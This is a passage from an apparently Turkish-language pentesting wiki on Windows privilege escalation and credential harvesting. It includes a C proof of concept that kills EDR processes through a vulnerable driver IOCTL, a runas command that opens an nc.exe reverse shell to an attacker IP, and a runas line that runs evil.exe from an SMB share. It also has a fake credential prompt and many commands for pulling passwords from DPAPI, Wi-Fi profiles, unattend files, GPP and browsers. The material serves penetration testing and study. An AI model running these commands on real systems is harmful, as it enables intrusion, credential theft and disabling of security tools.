Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'BUILTIN\Users'} } catch {}}
```
### Başlangıçta çalıştır

**Farklı bir kullanıcı tarafından çalıştırılacak bazı registry veya binary dosyalarını üzerine yazıp yazamayacağınızı kontrol edin.**\
**Okuyun** ilginç **autoruns locations to escalate privileges** hakkında daha fazla bilgi edinmek için **aşağıdaki sayfayı**:


{{#ref}}
privilege-escalation-with-autorun-binaries.md
{{#endref}}

### Sürücüler

Olası **third party weird/vulnerable** sürücüleri arayın
```bash
driverquery
driverquery.exe /fo table
driverquery /SI
```
Eğer bir driver arbitrary kernel read/write primitive (kötü tasarlanmış IOCTL handlers'ta yaygın) açığa çıkarıyorsa, kernel memory'den doğrudan bir SYSTEM token çalarak yetki yükseltebilirsiniz. Adım adım teknik için bakın:

{{#ref}}
arbitrary-kernel-rw-token-theft.md
{{#endref}}

#### device objects üzerindeki eksik FILE_DEVICE_SECURE_OPEN'un kötüye kullanılması (LPE + EDR kill)

Bazı signed third‑party driver'lar device object'larını IoCreateDeviceSecure ile güçlü bir SDDL kullanarak oluşturuyor ama DeviceCharacteristics içinde FILE_DEVICE_SECURE_OPEN'u ayarlamayı unutuyorlar. Bu bayrak olmadan, secure DACL, cihaz ekstra bir bileşen içeren bir yol ile açıldığında uygulanmıyor; bu da herhangi bir ayrıcalıksız kullanıcının aşağıdaki gibi bir namespace path kullanarak bir handle elde etmesine izin veriyor:

- \\ .\\DeviceName\\anything
- \\ .\\amsdk\\anyfile (gerçek bir vaka örneğinden)

Bir kullanıcı cihazı açabildiğinde, driver tarafından expose edilen privileged IOCTLs LPE ve tampering için kötüye kullanılabilir. Vahşi ortamda gözlemlenen örnek yetenekler:
- Arbitrary process'lere full-access handle döndürme (token theft / SYSTEM shell via DuplicateTokenEx/CreateProcessAsUser).
- Kısıtlamasız raw disk read/write (offline tampering, boot-time persistence tricks).
- Arbitrary process'leri sonlandırma, Protected Process/Light (PP/PPL) dahil, bu da AV/EDR'nin user land'den kernel aracılığıyla kill edilmesine olanak tanır.

Minimal PoC pattern (user mode):
```c
// Example based on a vulnerable antimalware driver
#define IOCTL_REGISTER_PROCESS  0x80002010
#define IOCTL_TERMINATE_PROCESS 0x80002048

HANDLE h = CreateFileA("\\\\.\\amsdk\\anyfile", GENERIC_READ|GENERIC_WRITE, 0, 0, OPEN_EXISTING, 0, 0);
DWORD me = GetCurrentProcessId();
DWORD target = /* PID to kill or open */;
DeviceIoControl(h, IOCTL_REGISTER_PROCESS,  &me,     sizeof(me),     0, 0, 0, 0);
DeviceIoControl(h, IOCTL_TERMINATE_PROCESS, &target, sizeof(target), 0, 0, 0, 0);
```
Geliştiriciler için Önlemler
- DACL ile kısıtlanması amaçlanan aygıt nesneleri oluştururken her zaman FILE_DEVICE_SECURE_OPEN'ı ayarlayın.
- Ayrıcalıklı işlemler için çağıranın bağlamını doğrulayın. İşlem sonlandırma veya handle geri verilmesine izin vermeden önce PP/PPL kontrolleri ekleyin.
- IOCTLs'i (access masks, METHOD_*, girdi doğrulaması) sınırlandırın ve doğrudan kernel ayrıcalıkları yerine arabulucu modelleri düşünün.

Savunucular için Tespit Fikirleri
- Şüpheli aygıt adlarının (ör. \\ .\\amsdk*) user-mode tarafından yapılan açılışlarını ve kötüye kullanımı işaret eden belirli IOCTL dizilerini izleyin.
- Microsoft’un vulnerable driver blocklist'ini (HVCI/WDAC/Smart App Control) uygulayın ve kendi allow/deny listelerinizi yönetin.


## PATH DLL Hijacking

Eğer **PATH üzerinde bulunan bir klasörde yazma izinleriniz** varsa, bir işlem tarafından yüklenen bir DLL'i ele geçirerek **ayrıcalıkları yükseltebilirsiniz**.

PATH içindeki tüm klasörlerin izinlerini kontrol edin:
```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```
Bu kontrolün nasıl kötüye kullanılacağı hakkında daha fazla bilgi için:

{{#ref}}
dll-hijacking/writable-sys-path-+dll-hijacking-privesc.md
{{#endref}}

## Ağ

### Paylaşımlar
```bash
net view #Get a list of computers
net view /all /domain [domainname] #Shares on the domains
net view \\computer /ALL #List shares of a computer
net use x: \\computer\share #Mount the share locally
net share #Check current shares
```
### hosts file

hosts file üzerinde sert kodlanmış diğer bilinen bilgisayarları kontrol edin
```
type C:\Windows\System32\drivers\etc\hosts
```
### Ağ Arayüzleri ve DNS
```
ipconfig /all
Get-NetIPConfiguration | ft InterfaceAlias,InterfaceDescription,IPv4Address
Get-DnsClientServerAddress -AddressFamily IPv4 | ft
```
### Açık Portlar

Dışarıdan **kısıtlı servisleri** kontrol edin
```bash
netstat -ano #Opened ports?
```
### Yönlendirme Tablosu
```
route print
Get-NetRoute -AddressFamily IPv4 | ft DestinationPrefix,NextHop,RouteMetric,ifIndex
```
### ARP Tablosu
```
arp -A
Get-NetNeighbor -AddressFamily IPv4 | ft ifIndex,IPAddress,L
```
### Firewall Kuralları

[**Check this page for Firewall related commands**](../basic-cmd-for-pentesters.md#firewall) **(kuralları listele, kurallar oluştur, kapat, kapat...)**

Daha fazla[ commands for network enumeration here](../basic-cmd-for-pentesters.md#network)

### Windows Subsystem for Linux (wsl)
```bash
C:\Windows\System32\bash.exe
C:\Windows\System32\wsl.exe
```
`bash.exe` ikili dosyası ayrıca `C:\Windows\WinSxS\amd64_microsoft-windows-lxssbash_[...]\bash.exe` içinde bulunabilir

Root kullanıcı haklarına erişirseniz herhangi bir porta dinleyici açabilirsiniz (ilk kez `nc.exe` ile bir porta dinleyici açtığınızda, GUI üzerinden `nc`'nin firewall tarafından izinli olup olmayacağı sorulur).
```bash
wsl whoami
./ubuntun1604.exe config --default-user root
wsl whoami
wsl python -c 'BIND_OR_REVERSE_SHELL_PYTHON_CODE'
```
bash'i kolayca root olarak başlatmak için `--default-user root` deneyebilirsiniz

`WSL` dosya sistemini `C:\Users\%USERNAME%\AppData\Local\Packages\CanonicalGroupLimited.UbuntuonWindows_79rhkp1fndgsc\LocalState\rootfs\` klasöründe keşfedebilirsiniz

## Windows Kimlik Bilgileri

### Winlogon Kimlik Bilgileri
```bash
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul | findstr /i "DefaultDomainName DefaultUserName DefaultPassword AltDefaultDomainName AltDefaultUserName AltDefaultPassword LastUsedUsername"

#Other way
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultPassword
```
### Kimlik bilgileri yöneticisi / Windows vault

From [https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault](https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault)\  
Windows Vault, sunucular, web siteleri ve diğer programlar için **Windows**'un **kullanıcıları otomatik olarak oturum açtırmasını sağlayan** kimlik bilgilerini depolar. İlk bakışta, kullanıcıların Facebook, Twitter, Gmail vb. kimlik bilgilerini tarayıcılar aracılığıyla otomatik giriş için saklayabildiği gibi görünebilir. Ancak durum böyle değildir.

Windows Vault, Windows'un kullanıcıları otomatik olarak oturum açtırabileceği kimlik bilgilerini depolar; bu, bir kaynağa (sunucu veya bir web sitesi) erişmek için kimlik bilgisine ihtiyaç duyan herhangi bir **Windows uygulamasının** **bu Credential Manager'dan** ve Windows Vault'tan yararlanabileceği ve sağlanan kimlik bilgilerini kullanıcıların sürekli kullanıcı adı ve şifre girmesi yerine kullanabileceği anlamına gelir.

Uygulamalar Credential Manager ile etkileşime girmezse, belirli bir kaynak için kimlik bilgilerini kullanabilmelerinin mümkün olduğunu düşünmüyorum. Bu yüzden, uygulamanız vault'tan yararlanmak istiyorsa, varsayılan depolama vault'undan o kaynak için kimlik bilgilerini talep etmek üzere **credential manager ile iletişim kurup o kaynak için kimlik bilgilerini istemelidir**.

Makinede depolanan kimlik bilgilerini listelemek için `cmdkey` kullanın.
```bash
cmdkey /list
Currently stored credentials:
Target: Domain:interactive=WORKGROUP\Administrator
Type: Domain Password
User: WORKGROUP\Administrator
```
Daha sonra kaydedilmiş kimlik bilgilerini kullanmak için `/savecred` seçeneğiyle `runas` kullanabilirsiniz. Aşağıdaki örnek, bir SMB paylaşımı üzerinden uzak bir ikiliyi çağırıyor.
```bash
runas /savecred /user:WORKGROUP\Administrator "\\10.XXX.XXX.XXX\SHARE\evil.exe"
```
Sağlanan bir credential seti ile `runas` kullanımı.
```bash
C:\Windows\System32\runas.exe /env /noprofile /user:<username> <password> "c:\users\Public\nc.exe -nc <attacker-ip> 4444 -e cmd.exe"
```
Unutmayın ki mimikatz, lazagne, [credentialfileview](https://www.nirsoft.net/utils/credentials_file_view.html), [VaultPasswordView](https://www.nirsoft.net/utils/vault_password_view.html), veya [Empire Powershells module](https://github.com/EmpireProject/Empire/blob/master/data/module_source/credentials/dumpCredStore.ps1) tarafından elde edilebilir.

### DPAPI

The **Data Protection API (DPAPI)**, verilerin simetrik şifrelenmesi için bir yöntem sağlar; ağırlıklı olarak Windows işletim sistemi içinde asimetrik özel anahtarların simetrik şifrelenmesi için kullanılır. Bu şifreleme, entropiye önemli katkıda bulunan bir kullanıcı veya sistem sırrını kullanır.

**DPAPI enables the encryption of keys through a symmetric key that is derived from the user's login secrets**. Sistem şifrelemesi senaryolarında, sistemin domain kimlik doğrulama sırlarını kullanır.

Şifrelenmiş kullanıcı RSA anahtarları, DPAPI kullanılarak, %APPDATA%\Microsoft\Protect\{SID} dizininde saklanır; burada {SID} kullanıcının [Security Identifier](https://en.wikipedia.org/wiki/Security_Identifier) değerini temsil eder. **The DPAPI key, co-located with the master key that safeguards the user's private keys in the same file**, tipik olarak 64 byte rastgele veriden oluşur. (Bu dizine erişimin kısıtlı olduğunu, içeriğinin CMD'de `dir` komutu ile listelenmesinin engellendiğini; ancak PowerShell ile listelenebileceğini not etmek önemlidir.)
```bash
Get-ChildItem  C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem  C:\Users\USER\AppData\Local\Microsoft\Protect\
```
Doğru argümanlar (`/pvk` veya `/rpc`) ile **mimikatz module** `dpapi::masterkey` kullanarak bunu deşifre edebilirsiniz.

**credentials files protected by the master password** genellikle şu konumlarda bulunur:
```bash
dir C:\Users\username\AppData\Local\Microsoft\Credentials\
dir C:\Users\username\AppData\Roaming\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\
```
Uygun `/masterkey` ile **mimikatz module** `dpapi::cred` kullanarak decrypt edebilirsiniz.\
`sekurlsa::dpapi` modülüyle (eğer root iseniz) **bellekten** birçok **DPAPI** **masterkeys** çıkarabilirsiniz.

{{#ref}}
dpapi-extracting-passwords.md
{{#endref}}

### PowerShell Kimlik Bilgileri

**PowerShell kimlik bilgileri** genellikle scripting ve otomasyon görevlerinde, şifrelenmiş kimlik bilgilerini kolayca saklamak için kullanılır. Kimlik bilgileri **DPAPI** ile korunur; bu da genellikle oluşturuldukları aynı kullanıcı tarafından aynı bilgisayarda çözülebilecekleri anlamına gelir.

Dosyada bulunan bir PowerShell kimlik bilgisini **çözmek** için şunu yapabilirsiniz:
```bash
PS C:\> $credential = Import-Clixml -Path 'C:\pass.xml'
PS C:\> $credential.GetNetworkCredential().username

john

PS C:\htb> $credential.GetNetworkCredential().password

JustAPWD!
```
### Wi-Fi
```bash
#List saved Wifi using
netsh wlan show profile
#To get the clear-text password use
netsh wlan show profile <SSID> key=clear
#Oneliner to extract all wifi passwords
cls & echo. & for /f "tokens=3,* delims=: " %a in ('netsh wlan show profiles ^| find "Profile "') do @echo off > nul & (netsh wlan show profiles name="%b" key=clear | findstr "SSID Cipher Content" | find /v "Number" & echo.) & @echo on*
```
### Kaydedilmiş RDP Bağlantıları

Bunları şu konumlarda bulabilirsiniz: `HKEY_USERS\<SID>\Software\Microsoft\Terminal Server Client\Servers\`\
ve `HKCU\Software\Microsoft\Terminal Server Client\Servers\`

### Son Çalıştırılan Komutlar
```
HCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
HKCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
```
### **Uzak Masaüstü Kimlik Bilgileri Yöneticisi**
```
%localappdata%\Microsoft\Remote Desktop Connection Manager\RDCMan.settings
```
Uygun `/masterkey` ile **Mimikatz** `dpapi::rdg` modülünü kullanarak **herhangi .rdg dosyalarını deşifre edebilirsiniz**\
Mimikatz `sekurlsa::dpapi` modülü ile bellekten **birçok DPAPI masterkey** çıkarabilirsiniz

### Sticky Notes

Kullanıcılar genellikle Windows iş istasyonlarındaki StickyNotes uygulamasını bunun bir veritabanı dosyası olduğunu fark etmeden **save passwords** ve diğer bilgileri saklamak için kullanır. Bu dosya `C:\Users\<user>\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite` konumunda bulunur ve her zaman aranıp incelenmeye değerdir.

### AppCmd.exe

**Not: AppCmd.exe'den passwords kurtarmak için Administrator olmanız ve High Integrity seviyesinde çalıştırmanız gerekir.**\
**AppCmd.exe** `%systemroot%\system32\inetsrv\` dizininde bulunur.\
Bu dosya mevcutsa bazı **credentials** yapılandırılmış olabilir ve kurtarılabilir.

Bu kod [**PowerUP**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1) projesinden alınmıştır:
```bash
function Get-ApplicationHost {
$OrigError = $ErrorActionPreference
$ErrorActionPreference = "SilentlyContinue"

# Check if appcmd.exe exists
if (Test-Path  ("$Env:SystemRoot\System32\inetsrv\appcmd.exe")) {
# Create data table to house results
$DataTable = New-Object System.Data.DataTable

# Create and name columns in the data table
$Null = $DataTable.Columns.Add("user")
$Null = $DataTable.Columns.Add("pass")
$Null = $DataTable.Columns.Add("type")
$Null = $DataTable.Columns.Add("vdir")
$Null = $DataTable.Columns.Add("apppool")

# Get list of application pools
Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppools /text:name" | ForEach-Object {

# Get application pool name
$PoolName = $_

# Get username
$PoolUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.username"
$PoolUser = Invoke-Expression $PoolUserCmd

# Get password
$PoolPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.password"
$PoolPassword = Invoke-Expression $PoolPasswordCmd

# Check if credentials exists
if (($PoolPassword -ne "") -and ($PoolPassword -isnot [system.array])) {
# Add credentials to database
$Null = $DataTable.Rows.Add($PoolUser, $PoolPassword,'Application Pool','NA',$PoolName)
}
}

# Get list of virtual directories
Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir /text:vdir.name" | ForEach-Object {

# Get Virtual Directory Name
$VdirName = $_

# Get username
$VdirUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:userName"
$VdirUser = Invoke-Expression $VdirUserCmd

# Get password
$VdirPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:password"
$VdirPassword = Invoke-Expression $VdirPasswordCmd

# Check if credentials exists
if (($VdirPassword -ne "") -and ($VdirPassword -isnot [system.array])) {
# Add credentials to database
$Null = $DataTable.Rows.Add($VdirUser, $VdirPassword,'Virtual Directory',$VdirName,'NA')
}
}

# Check if any passwords were found
if( $DataTable.rows.Count -gt 0 ) {
# Display results in list view that can feed into the pipeline
$DataTable |  Sort-Object type,user,pass,vdir,apppool | Select-Object user,pass,type,vdir,apppool -Unique
}
else {
# Status user
Write-Verbose 'No application pool or virtual directory passwords were found.'
$False
}
}
else {
Write-Verbose 'Appcmd.exe does not exist in the default location.'
$False
}
$ErrorActionPreference = $OrigError
}
```
### SCClient / SCCM

`C:\Windows\CCM\SCClient.exe` dosyasının varlığını kontrol edin.\
Yükleyiciler **SYSTEM privileges** ile çalıştırılır; birçoğu **DLL Sideloading (Bilgi kaynağı: [https://github.com/enjoiz/Privesc](https://github.com/enjoiz/Privesc))**'e karşı savunmasızdır.
```bash
$result = Get-WmiObject -Namespace "root\ccm\clientSDK" -Class CCM_Application -Property * | select Name,SoftwareVersion
if ($result) { $result }
else { Write "Not Installed." }
```
## Dosyalar ve Kayıt Defteri (Kimlik Bilgileri)

### Putty Creds
```bash
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s | findstr "HKEY_CURRENT_USER HostName PortNumber UserName PublicKeyFile PortForwardings ConnectionSharing ProxyPassword ProxyUsername" #Check the values saved in each session, user/password could be there
```
### Putty SSH Host Anahtarları
```
reg query HKCU\Software\SimonTatham\PuTTY\SshHostKeys\
```
### Kayıt defterindeki SSH keys

SSH private keys, kayıt defteri anahtarı `HKCU\Software\OpenSSH\Agent\Keys` içinde saklanabilir; bu yüzden orada ilginç bir şey olup olmadığını kontrol etmelisiniz:
```bash
reg query 'HKEY_CURRENT_USER\Software\OpenSSH\Agent\Keys'
```
Eğer o yolun içinde herhangi bir kayıt bulursanız muhtemelen kaydedilmiş bir SSH key'idir. Şifrelenmiş olarak saklanır ancak [https://github.com/ropnop/windows_sshagent_extract](https://github.com/ropnop/windows_sshagent_extract) kullanılarak kolayca çözülebilir.\
Bu teknik hakkında daha fazla bilgi: [https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)

Eğer `ssh-agent` servisi çalışmıyorsa ve sistem açılışında otomatik başlamasını istiyorsanız şunu çalıştırın:
```bash
Get-Service ssh-agent | Set-Service -StartupType Automatic -PassThru | Start-Service
```
> [!TIP]
> Bu teknik artık geçerli değil gibi görünüyor. Bazı ssh anahtarları oluşturmaya, bunları `ssh-add` ile eklemeye ve bir makineye ssh ile bağlanmaya çalıştım. HKCU\Software\OpenSSH\Agent\Keys kayıt defteri yok ve procmon, asimetrik anahtar doğrulaması sırasında `dpapi.dll` kullanımını tespit etmedi.

### Gözetimsiz dosyalar
```
C:\Windows\sysprep\sysprep.xml
C:\Windows\sysprep\sysprep.inf
C:\Windows\sysprep.inf
C:\Windows\Panther\Unattended.xml
C:\Windows\Panther\Unattend.xml
C:\Windows\Panther\Unattend\Unattend.xml
C:\Windows\Panther\Unattend\Unattended.xml
C:\Windows\System32\Sysprep\unattend.xml
C:\Windows\System32\Sysprep\unattended.xml
C:\unattend.txt
C:\unattend.inf
dir /s *sysprep.inf *sysprep.xml *unattended.xml *unattend.xml *unattend.txt 2>nul
```
Bu dosyaları ayrıca **metasploit** kullanarak da arayabilirsiniz: _post/windows/gather/enum_unattend_
```xml
<component name="Microsoft-Windows-Shell-Setup" publicKeyToken="31bf3856ad364e35" language="neutral" versionScope="nonSxS" processorArchitecture="amd64">
<AutoLogon>
<Password>U2VjcmV0U2VjdXJlUGFzc3dvcmQxMjM0Kgo==</Password>
<Enabled>true</Enabled>
<Username>Administrateur</Username>
</AutoLogon>

<UserAccounts>
<LocalAccounts>
<LocalAccount wcm:action="add">
<Password>*SENSITIVE*DATA*DELETED*</Password>
<Group>administrators;users</Group>
<Name>Administrateur</Name>
</LocalAccount>
</LocalAccounts>
</UserAccounts>
```
### SAM & SYSTEM yedekleri
```bash
# Usually %SYSTEMROOT% = C:\Windows
%SYSTEMROOT%\repair\SAM
%SYSTEMROOT%\System32\config\RegBack\SAM
%SYSTEMROOT%\System32\config\SAM
%SYSTEMROOT%\repair\system
%SYSTEMROOT%\System32\config\SYSTEM
%SYSTEMROOT%\System32\config\RegBack\system
```
### Bulut Kimlik Bilgileri
```bash
#From user home
.aws\credentials
AppData\Roaming\gcloud\credentials.db
AppData\Roaming\gcloud\legacy_credentials
AppData\Roaming\gcloud\access_tokens.db
.azure\accessTokens.json
.azure\azureProfile.json
```
### McAfee SiteList.xml

Adı **SiteList.xml** olan bir dosya arayın

### Önbelleğe Alınmış GPP Parolası

Daha önce, Group Policy Preferences (GPP) aracılığıyla bir grup makinede özel yerel yönetici hesaplarının dağıtılmasına izin veren bir özellik vardı. Ancak bu yöntemin önemli güvenlik açıkları vardı. Birincisi, SYSVOL'de XML dosyaları olarak depolanan Group Policy Objects (GPOs) herhangi bir domain kullanıcısı tarafından erişilebiliyordu. İkincisi, bu GPP'lerdeki parolalar, kamuya açık şekilde belgelenmiş varsayılan bir anahtar kullanılarak AES256 ile şifrelenmişti ve herhangi bir kimlikli kullanıcı tarafından deşifre edilebiliyordu. Bu, kullanıcıların yükseltilmiş ayrıcalıklar elde etmesine izin verebilecek ciddi bir risk oluşturuyordu.

Bu riski azaltmak için, içinde "cpassword" alanı boş olmayan yerel önbelleğe alınmış GPP dosyalarını tarayan bir fonksiyon geliştirildi. Böyle bir dosya bulunduğunda fonksiyon parolayı deşifre eder ve özel bir PowerShell nesnesi döner. Bu nesne, GPP ile dosyanın konumu hakkında ayrıntılar içerir ve bu güvenlik açığının tespit edilip giderilmesine yardımcı olur.

Bu dosyaları bulmak için `C:\ProgramData\Microsoft\Group Policy\history` veya _**C:\Documents and Settings\All Users\Application Data\Microsoft\Group Policy\history** (W Vista'dan önce)_ klasörlerinde arayın:

- Groups.xml
- Services.xml
- Scheduledtasks.xml
- DataSources.xml
- Printers.xml
- Drives.xml

**cPassword'i deşifre etmek için:**
```bash
#To decrypt these passwords you can decrypt it using
gpp-decrypt j1Uyj3Vx8TY9LtLZil2uAuZkFQA/4latT76ZwgdHdhw
```
crackmapexec kullanarak passwords almak:
```bash
crackmapexec smb 10.10.10.10 -u username -p pwd -M gpp_autologin
```
### IIS Web Yapılandırması
```bash
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```

```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config
C:\inetpub\wwwroot\web.config
```

```bash
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
Get-Childitem –Path C:\xampp\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```
Kimlik bilgileri içeren web.config örneği:
```xml
<authentication mode="Forms">
<forms name="login" loginUrl="/admin">
<credentials passwordFormat = "Clear">
<user name="Administrator" password="SuperAdminPassword" />
</credentials>
</forms>
</authentication>
```
### OpenVPN kimlik bilgileri
```csharp
Add-Type -AssemblyName System.Security
$keys = Get-ChildItem "HKCU:\Software\OpenVPN-GUI\configs"
$items = $keys | ForEach-Object {Get-ItemProperty $_.PsPath}

foreach ($item in $items)
{
$encryptedbytes=$item.'auth-data'
$entropy=$item.'entropy'
$entropy=$entropy[0..(($entropy.Length)-2)]

$decryptedbytes = [System.Security.Cryptography.ProtectedData]::Unprotect(
$encryptedBytes,
$entropy,
[System.Security.Cryptography.DataProtectionScope]::CurrentUser)

Write-Host ([System.Text.Encoding]::Unicode.GetString($decryptedbytes))
}
```
### Logs
```bash
# IIS
C:\inetpub\logs\LogFiles\*

#Apache
Get-Childitem –Path C:\ -Include access.log,error.log -File -Recurse -ErrorAction SilentlyContinue
```
### Credentials isteyin

**Kullanıcıdan kendi credentials'ını veya farklı bir kullanıcının credentials'ını girmesini isteyebilirsiniz** eğer bunları bilebileceğini düşünüyorsanız (doğrudan istemciye **credentials**'ı **sormak** gerçekten **risklidir**):
```bash
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\'+[Environment]::UserName,[Environment]::UserDomainName); $cred.getnetworkcredential().password
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\'+'anotherusername',[Environment]::UserDomainName); $cred.getnetworkcredential().password

#Get plaintext
$cred.GetNetworkCredential() | fl
```
### **Kimlik bilgilerini içerebilecek olası dosya adları**

Bir süre önce bazı dosyalarda **parolalar** **düz metin** veya **Base64** olarak bulunuyordu
```bash
$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history
vnc.ini, ultravnc.ini, *vnc*
web.config
php.ini httpd.conf httpd-xampp.conf my.ini my.cnf (XAMPP, Apache, PHP)
SiteList.xml #McAfee
ConsoleHost_history.txt #PS-History
*.gpg
*.pgp
*config*.php
elasticsearch.y*ml
kibana.y*ml
*.p12
*.der
*.csr
*.cer
known_hosts
id_rsa
id_dsa
*.ovpn
anaconda-ks.cfg
hostapd.conf
rsyncd.conf
cesi.conf
supervisord.conf
tomcat-users.xml
*.kdbx
KeePass.config
Ntds.dit
SAM
SYSTEM
FreeSSHDservice.ini
access.log
error.log
server.xml
ConsoleHost_history.txt
setupinfo
setupinfo.bak
key3.db         #Firefox
key4.db         #Firefox
places.sqlite   #Firefox
"Login Data"    #Chrome
Cookies         #Chrome
Bookmarks       #Chrome
History         #Chrome
TypedURLsTime   #IE
TypedURLs       #IE
%SYSTEMDRIVE%\pagefile.sys
%WINDIR%\debug\NetSetup.log
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software, %WINDIR%\repair\security
%WINDIR%\iis6.log
%WINDIR%\system32\config\AppEvent.Evt
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
%WINDIR%\system32\CCM\logs\*.log
%USERPROFILE%\ntuser.dat
%USERPROFILE%\LocalS~1\Tempor~1\Content.IE5\index.dat
```
Önerilen tüm dosyaları ara:
```
cd C:\
dir /s/b /A:-D RDCMan.settings == *.rdg == *_history* == httpd.conf == .htpasswd == .gitconfig == .git-credentials == Dockerfile == docker-compose.yml == access_tokens.db == accessTokens.json == azureProfile.json == appcmd.exe == scclient.exe == *.gpg$ == *.pgp$ == *config*.php == elasticsearch.y*ml == kibana.y*ml == *.p12$ == *.cer$ == known_hosts == *id_rsa* == *id_dsa* == *.ovpn == tomcat-users.xml == web.config == *.kdbx == KeePass.config == Ntds.dit == SAM == SYSTEM == security == software == FreeSSHDservice.ini == sysprep.inf == sysprep.xml == *vnc*.ini == *vnc*.c*nf* == *vnc*.txt == *vnc*.xml == php.ini == https.conf == https-xampp.conf == my.ini == my.cnf == access.log == error.log == server.xml == ConsoleHost_history.txt == pagefile.sys == NetSetup.log == iis6.log == AppEvent.Evt == SecEvent.Evt == default.sav == security.sav == software.sav == system.sav == ntuser.dat == index.dat == bash.exe == wsl.exe 2>nul | findstr /v ".dll"
```

```
Get-Childitem –Path C:\ -Include *unattend*,*sysprep* -File -Recurse -ErrorAction SilentlyContinue | where {($_.Name -like "*.xml" -or $_.Name -like "*.txt" -or $_.Name -like "*.ini")}
```
### Credentials in the RecycleBin

Ayrıca Bin'i kontrol ederek içinde credentials olup olmadığına bakmalısınız

Çeşitli programlar tarafından kaydedilmiş parolaları **kurtarmak** için şu adresi kullanabilirsiniz: [http://www.nirsoft.net/password_recovery_tools.html](http://www.nirsoft.net/password_recovery_tools.html)

### Kayıt Defteri İçinde

**Credentials içerebilecek diğer kayıt defteri anahtarları**
```bash
reg query "HKCU\Software\ORL\WinVNC3\Password"
reg query "HKLM\SYSTEM\CurrentControlSet\Services\SNMP" /s
reg query "HKCU\Software\TightVNC\Server"
reg query "HKCU\Software\OpenSSH\Agent\Key"
```
[**Extract openssh keys from registry.**](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)

### Tarayıcı Geçmişi

Parolaların saklandığı **Chrome veya Firefox** db'lerini kontrol etmelisiniz.\
Ayrıca tarayıcıların geçmişini, yer imlerini ve favorilerini kontrol edin; belki bazı **parolalar** orada saklıdır.

Tarayıcılardan parola çıkarmak için araçlar:

- Mimikatz: `dpapi::chrome`
- [**SharpWeb**](https://github.com/djhohnstein/SharpWeb)
- [**SharpChromium**](https://github.com/djhohnstein/SharpChromium)
- [**SharpDPAPI**](https://github.com/GhostPack/SharpDPAPI)

### **COM DLL Overwriting**

**Component Object Model (COM)**, farklı dillerde yazılmış yazılım bileşenleri arasında **intercommunication** sağlayan Windows içinde yerleşik bir teknolojidir. Her COM bileşeni **identified via a class ID (CLSID)** ile tanımlanır ve her bileşen bir veya daha fazla arayüz aracılığıyla işlevsellik sunar; bu arayüzler **identified via interface IDs (IIDs)** ile tanımlanır.

COM sınıfları ve arayüzleri sırasıyla kayıt defterinde **HKEY\CLASSES\ROOT\CLSID** ve **HKEY\CLASSES\ROOT\Interface** altında tanımlanır. Bu kayıt, **HKEY\LOCAL\MACHINE\Software\Classes** + **HKEY\CURRENT\USER\Software\Classes** birleştirilerek oluşturulur: **HKEY\CLASSES\ROOT.**

Bu kayıt içindeki CLSID'lerin içinde, **default value** ile bir **DLL**'e işaret eden ve **ThreadingModel** adlı bir değere sahip **InProcServer32** alt kaydını bulabilirsiniz; ThreadingModel şu değerleri alabilir: **Apartment** (Single-Threaded), **Free** (Multi-Threaded), **Both** (Single or Multi) veya **Neutral** (Thread Neutral).

![](<../../images/image (729).png>)

